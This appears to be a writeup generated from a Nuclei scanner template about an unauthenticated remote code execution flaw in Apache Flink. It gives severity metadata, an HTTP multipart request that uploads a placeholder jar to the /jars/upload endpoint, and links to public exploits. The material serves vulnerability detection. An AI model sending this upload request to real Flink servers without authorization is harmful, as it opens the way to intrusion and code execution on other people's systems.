# Nuclei Template: Apache Flink - Remote Code Execution
**Template ID:** apache-flink-unauth-rce
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-94
**Source:** Nuclei Template (`apache-flink-unauth-rce.yaml`)

## Vulnerability Information & PoC

## Description
Apache Flink contains an unauthenticated remote code execution vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /jars/upload HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3

--8ce4b16b22b58894aa86c421e8759df3
Content-Disposition: form-data; name="jarfile";filename="poc.jar"
Content-Type:application/octet-stream

  {{randstr}}
--8ce4b16b22b58894aa86c421e8759df3--
```

## References
- https://www.exploit-db.com/exploits/48978
- https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3
- https://github.com/LandGrey/flink-unauth-rce
